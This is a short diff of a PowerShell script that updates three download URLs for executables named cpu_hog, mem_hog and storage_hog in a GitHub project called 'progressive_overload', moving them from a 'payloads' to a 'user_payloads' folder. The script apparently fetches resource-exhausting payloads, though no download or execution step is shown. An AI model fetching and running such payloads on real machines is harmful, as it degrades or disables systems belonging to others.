@@ -1,8 +1,8 @@
 param( [string]$basePath )
 
-$cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.exe"
-$memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.exe"
-$storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.exe"
+$cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/user_payloads/cpu_hog.exe"
+$memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/user_payloads/mem_hog.exe"
+$storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/user_payloads/storage_hog.exe"
 $memPropertyName = "mem"
 $storagePropertyName = "store"
 $cpuPropertyName = "cpu"
